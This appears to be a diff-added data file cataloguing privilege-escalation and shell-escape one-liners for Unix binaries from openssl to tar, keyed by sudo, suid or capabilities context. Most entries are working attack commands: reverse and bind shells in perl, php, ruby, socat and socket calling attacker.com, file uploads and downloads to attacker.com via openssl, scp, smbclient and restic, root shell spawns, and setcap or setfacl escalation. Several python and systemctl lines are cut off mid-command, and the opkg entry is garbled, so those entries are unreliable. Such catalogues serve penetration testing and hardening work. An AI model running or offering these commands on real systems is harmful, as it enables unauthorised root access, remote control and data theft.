+openssl|sudo|download|sudo openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+openssl|sudo|library-load|sudo openssl req -engine ./lib.so
+openssl|suid|reverse-shell|./mkfifo /path/to/temp-socket
+openssl|suid|file-write|./echo DATA   openssl enc -out /path/to/output-file
+openssl|suid|file-write|./openssl enc -in /path/to/input-file -out /path/to/output-file
+openssl|suid|file-read|./openssl enc -in /path/to/input-file
+openssl|suid|upload|./openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file
+openssl|suid|download|./openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file
+openssl|suid|library-load|./openssl req -engine ./lib.so
+openvpn|sudo|shell|sudo openvpn --dev null --script-security 2 --up '/bin/sh -s'
+openvpn|sudo|file-read|sudo openvpn --config /path/to/input-file
+openvpn|suid|shell|openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
+openvpn|suid|file-read|./openvpn --config /path/to/input-file
+openvt|sudo|command|sudo openvt -- /path/to/command
+opkg|sudo|shell|sudo rpm opkg install x_1.0_all.deb
+pandoc|sudo|file-write|sudo echo DATA   pandoc -t plain -o /path/to/output-file
+pandoc|sudo|file-read|sudo pandoc -t plain /path/to/input-file
+pandoc|sudo|inherit|sudo echo '...' >/path/to/temp-file
+pandoc|suid|file-write|./echo DATA   pandoc -t plain -o /path/to/output-file
+pandoc|suid|file-read|./pandoc -t plain /path/to/input-file
+pandoc|suid|inherit|./echo '...' >/path/to/temp-file
+passwd|sudo|privilege-escalation|sudo echo -e 'x\nx'   passwd
+paste|sudo|file-read|sudo paste /path/to/input-file
+paste|suid|file-read|./paste /path/to/input-file
+pax|sudo|file-read|sudo pax -w /path/to/input-file   tar -xO
+pax|suid|file-read|./pax -w /path/to/input-file   tar -xO
+pdb|sudo|inherit|sudo echo '...' >/path/to/temp-file
+pdflatex|sudo|shell|sudo pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+pdflatex|sudo|file-write|sudo pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+pdflatex|sudo|file-read|sudo pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+pdflatex|suid|shell|./pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
+pdflatex|suid|file-write|./pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
+pdflatex|suid|file-read|./pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
+pdftex|sudo|shell|sudo pdftex --shell-escape '\write18{/bin/sh}\end'
+pdftex|suid|shell|./pdftex --shell-escape '\write18{/bin/sh}\end'
+perf|sudo|shell|sudo perf stat /bin/sh
+perf|suid|shell|perf stat /bin/sh -p
+perl|sudo|shell|sudo PERL5OPT=-d PERL5DB='exec "/bin/sh"' perl /dev/null
+perl|sudo|shell|sudo perl -e 'exec "/bin/sh"'
+perl|sudo|reverse-shell|sudo perl -e 'use Socket;$i="attacker.com";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl|sudo|file-read|sudo perl -ne print /path/to/input-file
+perl|sudo|upload|sudo perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>"attacker.com", PeerPort=>80, Proto=>"tcp") or die;open(my $file, "<", "/path/to/input-file") or die;$content = join("", <$file>);close($file);$headers = "POST / HTTP/1.1\r\nHost: attacker.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: " . length($content) . "\r\nConnection: close\r\n\r\n";print $s $headers . $content;while (<$s>) { }close($s);'
+perl|sudo|download|sudo perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>"attacker.com",PeerPort=>80,Proto=>"tcp") or die; print $s "GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "\r\n") { $in_content = 1; } } close($s); close($fh);'
+perl|suid|file-read|./perl -ne print /path/to/input-file
+perl|capabilities|shell|perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
+perlbug|sudo|shell|sudo perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
+pexec|sudo|shell|sudo pexec /bin/sh
+pexec|suid|shell|pexec /bin/sh -p
+pg|sudo|shell|sudo pg /etc/hosts
+pg|sudo|file-read|sudo pg /path/to/input-file
+pg|suid|shell|./pg /etc/hosts
+pg|suid|file-read|./pg /path/to/input-file
+php|sudo|shell|sudo php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+php|sudo|shell|sudo php -r 'passthru("/bin/sh -i");'
+php|sudo|shell|sudo php -r 'pcntl_exec("/bin/sh");'
+php|sudo|shell|sudo php -r 'system("/bin/sh -i");'
+php|sudo|command|sudo php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+php|sudo|command|sudo php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+php|sudo|command|sudo php -r 'echo shell_exec("/path/to/command");'
+php|sudo|reverse-shell|sudo php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+php|suid|shell|./php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+php|suid|shell|./php -r 'passthru("/bin/sh -i");'
+php|suid|shell|./php -r 'system("/bin/sh -i");'
+php|suid|shell|php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+php|suid|command|./php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
+php|suid|command|./php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
+php|suid|command|./php -r 'echo shell_exec("/path/to/command");'
+php|suid|reverse-shell|./php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
+php|capabilities|shell|php -r 'posix_setuid(0); $h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
+php|capabilities|shell|php -r 'posix_setuid(0); passthru("/bin/sh -i");'
+php|capabilities|shell|php -r 'posix_setuid(0); pcntl_exec("/bin/sh");'
+php|capabilities|shell|php -r 'posix_setuid(0); system("/bin/sh -i");'
+pic|sudo|shell|sudo pic -U
+pic|sudo|file-read|sudo pic /path/to/input-file
+pic|suid|shell|./pic -U
+pic|suid|file-read|./pic /path/to/input-file
+pico|sudo|shell|sudo nano
+pico|sudo|shell|sudo nano -s /bin/sh
+pico|sudo|file-write|sudo nano /path/to/output-file
+pico|sudo|file-read|sudo nano /path/to/input-file
+pico|suid|shell|./nano
+pico|suid|shell|nano -s '/bin/sh -p' /bin/sh -p ^T^T
+pico|suid|file-write|./nano /path/to/output-file
+pico|suid|file-read|./nano /path/to/input-file
+pidstat|sudo|shell|sudo pidstat -e /bin/sh
+pidstat|suid|shell|pidstat -e /bin/sh -p
+pip|sudo|shell|sudo pip config --editor '/bin/sh -s' edit
+pip|sudo|inherit|sudo echo '...' >setup.py
+pipx|sudo|inherit|sudo echo '...' >/path/to/file.py
+pkexec|sudo|shell|sudo pkexec /bin/sh
+pkg|sudo|command|sudo pkg install -y --no-repo-update ./x-1.0.txz
+plymouth|sudo|shell|sudo plymouth ask-for-password --prompt=x --command=/bin/sh
+plymouth|suid|shell|plymouth ask-for-password --prompt=x --command='/bin/sh -p'
+podman|sudo|shell|sudo podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
+poetry|sudo|inherit|sudo echo '...' >/path/to/temp-file
+posh|sudo|shell|sudo posh
+pr|sudo|file-read|sudo pr -T /path/to/input-file
+pr|suid|file-read|./pr -T /path/to/input-file
+procmail|sudo|command|sudo echo -e ':0\n  /path/to/command >/path/to/temp-file
+pry|sudo|inherit|sudo pry
+psftp|sudo|shell|sudo psftp
+psftp|suid|shell|./psftp
+psql|sudo|inherit|sudo psql
+psql|suid|inherit|./psql
+ptx|sudo|file-read|sudo ptx -w 999 /path/to/input-file
+ptx|suid|file-read|./ptx -w 999 /path/to/input-file
+puppet|sudo|shell|sudo puppet apply -e "exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"
+puppet|sudo|file-write|sudo puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
+puppet|sudo|file-read|sudo puppet filebucket -l diff /dev/null /path/to/input-file
+pwsh|sudo|shell|sudo pwsh
+pwsh|sudo|file-write|sudo pwsh -c '"DATA"   Out-File /path/to/output-file'
+pygmentize|sudo|file-read|sudo pygmentize -l text /path/to/input-file
+pyright|sudo|file-read|sudo pyright --outputjson /path/to/input-file
+pyright|sudo|file-read|sudo pyright -w /path/to/input-dir/
+pyright|sudo|file-read|sudo pyright /path/to/input-file
+python|sudo|shell|sudo python -c 'import os; os.execl("/bin/sh", "sh")'
+python|sudo|reverse-shell|sudo python -c 'import sys,socket,os,pty;s=socket.socket()
+python|sudo|file-write|sudo python -c 'open("/path/to/output-file","w+").write("DATA")'
+python|sudo|file-read|sudo python -c 'print(open("/path/to/input-file").read())'
+python|sudo|upload|sudo python -c 'import sys
+python|sudo|download|sudo python -c 'import sys; from os import environ as e
+python|sudo|library-load|sudo python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+python|suid|shell|python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python|suid|reverse-shell|./python -c 'import sys,socket,os,pty;s=socket.socket()
+python|suid|file-write|./python -c 'open("/path/to/output-file","w+").write("DATA")'
+python|suid|file-read|./python -c 'print(open("/path/to/input-file").read())'
+python|suid|upload|./python -c 'import sys
+python|suid|download|./python -c 'import sys; from os import environ as e
+python|suid|library-load|./python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+python|capabilities|shell|python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+python|capabilities|library-load|python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+python3|sudo|shell|sudo python -c 'import os; os.execl("/bin/sh", "sh")'
+python3|sudo|reverse-shell|sudo python -c 'import sys,socket,os,pty;s=socket.socket()
+python3|sudo|file-write|sudo python -c 'open("/path/to/output-file","w+").write("DATA")'
+python3|sudo|file-read|sudo python -c 'print(open("/path/to/input-file").read())'
+python3|sudo|upload|sudo python -c 'import sys
+python3|sudo|download|sudo python -c 'import sys; from os import environ as e
+python3|sudo|library-load|sudo python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+python3|suid|shell|python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python3|suid|reverse-shell|./python -c 'import sys,socket,os,pty;s=socket.socket()
+python3|suid|file-write|./python -c 'open("/path/to/output-file","w+").write("DATA")'
+python3|suid|file-read|./python -c 'print(open("/path/to/input-file").read())'
+python3|suid|upload|./python -c 'import sys
+python3|suid|download|./python -c 'import sys; from os import environ as e
+python3|suid|library-load|./python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+python3|capabilities|shell|python -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
+python3|capabilities|library-load|python -c 'from ctypes import cdll; cdll.LoadLibrary("/path/to/lib.so")'
+qpdf|sudo|file-read|sudo qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+qpdf|suid|file-read|./qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
+rake|sudo|file-read|sudo rake -f /path/to/input-file
+rake|sudo|inherit|sudo rake -p '...'
+ranger|sudo|shell|sudo ranger
+rc|sudo|shell|sudo rc
+rc|suid|shell|./rc
+readelf|sudo|file-read|sudo readelf -a @/path/to/input-file
+readelf|suid|file-read|./readelf -a @/path/to/input-file
+red|sudo|shell|sudo ed
+red|sudo|file-write|sudo ed /path/to/output-file
+red|sudo|file-read|sudo ed /path/to/input-file
+red|suid|shell|./ed
+red|suid|file-write|./ed /path/to/output-file
+red|suid|file-read|./ed /path/to/input-file
+redcarpet|sudo|file-read|sudo redcarpet /path/to/input-file
+redis|sudo|file-write|sudo redis-cli -h 127.0.0.1
+redis|suid|file-write|./redis-cli -h 127.0.0.1
+restic|sudo|shell|sudo RESTIC_PASSWORD_COMMAND='/bin/sh -c "/bin/sh 0<&2 1<&2"' restic backup
+restic|sudo|shell|sudo restic --password-command='/bin/sh -c "/bin/sh 0<&2 1<&2"' backup
+restic|sudo|command|sudo RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+restic|sudo|command|sudo restic --password-command='/path/to/command' backup
+restic|sudo|upload|sudo restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+restic|suid|shell|RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
+restic|suid|shell|restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
+restic|suid|command|./RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
+restic|suid|command|./restic --password-command='/path/to/command' backup
+restic|suid|upload|./restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
+rev|sudo|file-read|sudo rev /path/to/input-file   rev
+rev|suid|file-read|./rev /path/to/input-file   rev
+rlogin|sudo|upload|sudo rlogin -l DATA -p 12345 attacker.com
+rlogin|suid|upload|./rlogin -l DATA -p 12345 attacker.com
+rlwrap|sudo|shell|sudo rlwrap /bin/sh
+rlwrap|sudo|file-write|sudo rlwrap -l /path/to/output-file echo DATA
+rlwrap|suid|shell|rlwrap /bin/sh -p
+rlwrap|suid|file-write|./rlwrap -l /path/to/output-file echo DATA
+rpm|sudo|shell|sudo rpm --eval '%(/bin/sh 1>&2)'
+rpm|sudo|shell|sudo rpm --pipe '/bin/sh 0<&1'
+rpm|sudo|command|sudo rpm -ivh x-1.0-1.noarch.rpm
+rpm|sudo|inherit|sudo rpm --eval '%{lua:...}'
+rpm|suid|shell|./rpm --eval '%(/bin/sh 1>&2)'
+rpm|suid|shell|./rpm --pipe '/bin/sh 0<&1'
+rpm|suid|inherit|./rpm --eval '%{lua:...}'
+rpmdb|sudo|shell|sudo rpmdb --eval '%(/bin/sh 1>&2)'
+rpmdb|sudo|inherit|sudo rpmdb --eval '%{lua:...}'
+rpmdb|suid|shell|./rpmdb --eval '%(/bin/sh 1>&2)'
+rpmdb|suid|inherit|./rpmdb --eval '%{lua:...}'
+rpmquery|sudo|shell|sudo rpmquery --eval '%(/bin/sh 1>&2)'
+rpmquery|sudo|inherit|sudo rpmquery --eval '%{lua:...}'
+rpmquery|suid|shell|./rpmquery --eval '%(/bin/sh 1>&2)'
+rpmquery|suid|inherit|./rpmquery --eval '%{lua:...}'
+rpmverify|sudo|shell|sudo rpmverify --eval '%(/bin/sh 1>&2)'
+rpmverify|sudo|inherit|sudo rpmverify --eval '%{lua:...}'
+rpmverify|suid|shell|./rpmverify --eval '%(/bin/sh 1>&2)'
+rpmverify|suid|inherit|./rpmverify --eval '%{lua:...}'
+rsync|sudo|shell|sudo rsync -e '/bin/sh -c "/bin/sh 0<&2 1>&2"' x:x
+rsync|suid|shell|rsync -e '/bin/sh -p -c "/bin/sh -p 0<&2 1>&2"' x:x
+rsyslogd|sudo|command|sudo cat >/path/to/temp-file <<EOF
+rtorrent|sudo|shell|sudo echo 'execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc
+rtorrent|suid|shell|echo 'execute = /bin/sh,-p,-c,"/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty"' >~/.rtorrent.rc rtorrent
+ruby|sudo|shell|sudo ruby -e 'exec "/bin/sh"'
+ruby|sudo|reverse-shell|sudo ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){ io c.print io.read}end'
+ruby|sudo|file-write|sudo ruby -e 'File.open("/path/to/output-file", "w+") {  f  f.write("DATA") }'
+ruby|sudo|file-read|sudo ruby -e 'puts File.read("/path/to/input-file")'
+ruby|sudo|upload|sudo ruby -run -e httpd . -p 80
+ruby|sudo|download|sudo ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
+ruby|sudo|library-load|sudo ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
+ruby|capabilities|shell|ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
+run-mailcap|sudo|inherit|sudo run-mailcap --action=edit text/plain:/path/to/output-file
+run-mailcap|sudo|inherit|sudo run-mailcap --action=view text/plain:/etc/hosts
+run-parts|sudo|shell|sudo cp /bin/sh /path/to/temp-dir/
+run-parts|sudo|shell|sudo run-parts --new-session --regex '^sh$' /bin
+run-parts|suid|shell|cp /bin/sh /path/to/temp-dir/ run-parts /path/to/temp-dir/ --arg='-p'
+run-parts|suid|shell|run-parts --new-session --regex '^sh$' /bin --arg='-p'
+runscript|sudo|shell|sudo echo '! exec /bin/sh' >/path/to/temp-file
+runscript|suid|shell|./echo '! exec /bin/sh' >/path/to/temp-file
+rustc|sudo|file-write|sudo echo 'fn main() { println!("DATA"); }' >/path/to/temp-file
+rustc|sudo|file-read|sudo rustc /path/to/input-file
+rustc|sudo|inherit|sudo rustc --explain E0001
+rustdoc|sudo|file-write|sudo echo '//! DATA' >/path/to/temp-file
+rustdoc|sudo|file-read|sudo rustdoc /path/to/input-file
+rustfmt|sudo|file-read|sudo rustfmt /path/to/input-file
+rustup|sudo|command|sudo mkdir /path/to/temp-dir/bin/
+rvim|sudo|file-read|sudo vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+rvim|sudo|inherit|sudo vim
+rvim|sudo|inherit|sudo vim -c ':lua ...'
+rvim|sudo|inherit|sudo vim -c ':py ...'
+rvim|suid|file-read|./vim -c ':redir! >/path/to/output-file   echo "DATA"   redir END   q'
+rvim|suid|inherit|./vim
+rvim|suid|inherit|./vim -c ':lua ...'
+rvim|suid|inherit|./vim -c ':py ...'
+sash|sudo|shell|sudo sash
+sash|suid|shell|./sash
+scanmem|sudo|shell|sudo scanmem
+scanmem|suid|shell|./scanmem
+scp|sudo|shell|sudo echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+scp|sudo|shell|sudo scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+scp|sudo|upload|sudo scp /path/to/input-file user@attacker.com:/path/to/output-file
+scp|sudo|download|sudo scp user@attacker.com:/path/to/input-file /path/to/output-file
+scp|suid|shell|./echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
+scp|suid|shell|./scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:
+scp|suid|upload|./scp /path/to/input-file user@attacker.com:/path/to/output-file
+scp|suid|download|./scp user@attacker.com:/path/to/input-file /path/to/output-file
+screen|sudo|shell|sudo screen
+screen|sudo|file-write|sudo screen -L -Logfile /path/to/output-file echo DATA
+screen|sudo|file-write|sudo screen -L /path/to/output-file echo DATA
+script|sudo|shell|sudo script -q /dev/null
+script|sudo|file-write|sudo script -q -c '# DATA' /path/to/output-file
+script|suid|shell|./script -q /dev/null
+script|suid|file-write|./script -q -c '# DATA' /path/to/output-file
+scrot|sudo|shell|sudo scrot -e /bin/sh
+scrot|suid|shell|./scrot -e /bin/sh
+sed|sudo|shell|sudo sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+sed|sudo|shell|sudo sed e
+sed|sudo|file-write|sudo sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
+sed|sudo|file-read|sudo sed '' /path/to/input-file
+sed|suid|shell|./sed -n '1e exec /bin/sh 1>&0' /etc/hosts
+sed|suid|shell|./sed e
+sed|suid|file-write|./sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
+sed|suid|file-read|./sed '' /path/to/input-file
+service|sudo|shell|sudo service ../../bin/sh
+setarch|sudo|shell|sudo setarch -3 /bin/sh
+setarch|suid|shell|setarch -3 /bin/sh -p
+setcap|sudo|privilege-escalation|sudo setcap cap_setuid+ep /path/to/command
+setcap|suid|privilege-escalation|./setcap cap_setuid+ep /path/to/command
+setfacl|sudo|privilege-escalation|sudo setfacl -m u:$(id -un):rwx /path/to/input-file
+setfacl|suid|privilege-escalation|./setfacl -m u:$(id -un):rwx /path/to/input-file
+setlock|sudo|shell|sudo setlock - /bin/sh
+setlock|suid|shell|setlock - /bin/sh -p
+sftp|sudo|download|sudo sftp user@attacker.com
+sftp|suid|download|./sftp user@attacker.com
+sg|sudo|shell|sg root
+shred|sudo|file-write|sudo shred -u /path/to/output-file
+shred|suid|file-write|./shred -u /path/to/output-file
+shuf|sudo|file-write|sudo shuf -e DATA -o /path/to/output-file
+shuf|sudo|file-read|sudo shuf -z /path/to/input-file
+shuf|suid|file-write|./shuf -e DATA -o /path/to/output-file
+shuf|suid|file-read|./shuf -z /path/to/input-file
+slsh|sudo|shell|sudo slsh -e 'system("/bin/sh")'
+slsh|suid|shell|./slsh -e 'system("/bin/sh")'
+smbclient|sudo|shell|sudo smbclient '\\host\share'
+smbclient|sudo|upload|sudo smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'
+smbclient|sudo|download|sudo smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'
+snap|sudo|command|sudo snap install xxxx_1.0_all.snap --dangerous --devmode
+socat|sudo|shell|sudo socat - exec:/bin/sh,pty,ctty,raw,echo=0
+socat|sudo|reverse-shell|sudo socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
+socat|sudo|bind-shell|sudo socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
+socat|sudo|file-write|sudo socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+socat|sudo|file-read|sudo socat -u file:/path/to/input-file -
+socat|sudo|upload|sudo socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+socat|sudo|download|sudo socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+socat|suid|shell|socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
+socat|suid|reverse-shell|socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+socat|suid|bind-shell|socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
+socat|suid|file-write|./socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+socat|suid|file-read|./socat -u file:/path/to/input-file -
+socat|suid|upload|./socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
+socat|suid|download|./socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
+socket|sudo|reverse-shell|sudo socket -qvp '/bin/sh -i' attacker.com 12345
+socket|sudo|bind-shell|sudo socket -svp '/bin/sh -i' 12345
+socket|suid|reverse-shell|./socket -qvp '/bin/sh -i' attacker.com 12345
+socket|suid|bind-shell|./socket -svp '/bin/sh -i' 12345
+soelim|sudo|file-read|sudo soelim /path/to/input-file
+soelim|suid|file-read|./soelim /path/to/input-file
+softlimit|sudo|shell|sudo softlimit /bin/sh
+softlimit|suid|shell|softlimit /bin/sh -p
+sort|sudo|file-write|sudo echo DATA   sort -m -o /path/to/output-file
+sort|sudo|file-read|sudo sort -m /path/to/input-file
+sort|suid|file-write|./echo DATA   sort -m -o /path/to/output-file
+sort|suid|file-read|./sort -m /path/to/input-file
+split|sudo|shell|sudo split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+split|sudo|file-read|sudo split -b 999 --additional-suffix suffix /path/to/input-file prefix
+split|suid|shell|./split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts
+split|suid|file-read|./split -b 999 --additional-suffix suffix /path/to/input-file prefix
+sqlite3|sudo|shell|sudo sqlite3 /dev/null '.shell /bin/sh'
+sqlite3|sudo|file-write|sudo sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+sqlite3|sudo|file-read|sudo sqlite3 <<EOF
+sqlite3|suid|shell|./sqlite3 /dev/null '.shell /bin/sh'
+sqlite3|suid|file-write|./sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
+sqlite3|suid|file-read|./sqlite3 <<EOF
+sqlmap|sudo|inherit|sudo sqlmap -u 127.0.0.1 --eval='...'
+ss|sudo|file-read|sudo ss -a -F /path/to/input-file
+ss|suid|file-read|./ss -a -F /path/to/input-file
+ssh|sudo|shell|sudo ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
+ssh|sudo|shell|sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
+ssh|sudo|shell|sudo ssh localhost /bin/sh
+ssh|sudo|file-read|sudo ssh -F /path/to/input-file x
+ssh|sudo|upload|sudo echo DATA   ssh user@attacker.com 'cat >/path/to/output-file"
+ssh|sudo|download|sudo ssh user@attacker.com 'cat /path/to/input-file"
+ssh|suid|shell|./ssh localhost /bin/sh
+ssh|suid|file-read|./ssh -F /path/to/input-file x
+ssh|suid|upload|./echo DATA   ssh user@attacker.com 'cat >/path/to/output-file"
+ssh|suid|download|./ssh user@attacker.com 'cat /path/to/input-file"
+ssh-agent|sudo|shell|sudo ssh-agent /bin/sh
+ssh-agent|suid|shell|ssh-agent /bin/sh -p
+ssh-copy-id|sudo|file-write|sudo ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
+ssh-copy-id|sudo|file-read|sudo ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com
+ssh-keygen|sudo|library-load|sudo ssh-keygen -D /path/to/lib.so
+ssh-keygen|suid|library-load|./ssh-keygen -D /path/to/lib.so
+ssh-keyscan|sudo|file-read|sudo ssh-keyscan -f /path/to/input-file
+ssh-keyscan|suid|file-read|./ssh-keyscan -f /path/to/input-file
+sshfs|sudo|shell|sudo echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
+sshfs|sudo|command|sudo sshfs -o ssh_command=/path/to/command x: /path/to/dir/
+sshpass|sudo|shell|sudo sshpass /bin/sh
+sshpass|suid|shell|sshpass /bin/sh -p
+sshuttle|sudo|shell|sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
+start-stop-daemon|sudo|shell|sudo start-stop-daemon -S -x /bin/sh
+start-stop-daemon|suid|shell|start-stop-daemon -S -x /bin/sh -- -p
+stdbuf|sudo|shell|sudo stdbuf -i0 /bin/sh
+stdbuf|suid|shell|stdbuf -i0 /bin/sh -p
+strace|sudo|shell|sudo strace -o /dev/null /bin/sh
+strace|sudo|file-write|sudo strace -s 999 -o /path/to/output-file strace - DATA
+strace|suid|shell|strace -o /dev/null /bin/sh -p
+strings|sudo|file-read|sudo strings /path/to/input-file
+strings|suid|file-read|./strings /path/to/input-file
+su|sudo|shell|sudo su -c /bin/sh
+sudo|sudo|shell|sudo /bin/sh
+sysctl|sudo|command|sudo sysctl 'kernel.core_pattern= /path/to/command'
+sysctl|sudo|file-read|sudo sysctl -n "/../../path/to/input-file"
+sysctl|suid|command|./sysctl 'kernel.core_pattern= /path/to/command'
+sysctl|suid|file-read|./sysctl -n "/../../path/to/input-file"
+systemctl|sudo|shell|sudo echo '[Service]
+systemctl|sudo|shell|sudo echo /bin/sh >/path/to/temp-file
+systemctl|sudo|inherit|sudo systemctl
+systemctl|suid|shell|./echo '[Service]
+systemctl|suid|inherit|./systemctl
+systemd-resolve|sudo|inherit|sudo systemd-resolve --status
+systemd-run|sudo|shell|sudo systemd-run -S
+systemd-run|sudo|shell|sudo systemd-run -t /bin/sh
+systemd-run|sudo|command|sudo systemd-run /path/to/command
+tac|sudo|file-read|sudo tac -s 'RANDOM' /path/to/input-file
+tac|suid|file-read|./tac -s 'RANDOM' /path/to/input-file
+tail|sudo|file-read|sudo tail -c+0 /path/to/input-file
+tail|suid|file-read|./tail -c+0 /path/to/input-file
+tailscale|sudo|upload|sudo tailscale serve --http=12345 /path/to/input-file
+tar|sudo|shell|sudo echo '/bin/sh 0<&1' >/path/to/temp-file
+tar|sudo|shell|sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+tar|sudo|shell|sudo tar xf /dev/null -I '/bin/sh -c "/bin/sh 0<&2 1>&2"'
+tar|sudo|file-write|sudo echo DATA >/path/to/temp-file
+tar|sudo|file-read|sudo tar cf /dev/stdout /path/to/input-file -I 'tar xO'
+tar|sudo|upload|sudo tar cvf user@attacker.com:/path/to/output-file /path/to/input-file --rsh-command=/bin/ssh
+tar|sudo|download|sudo tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh
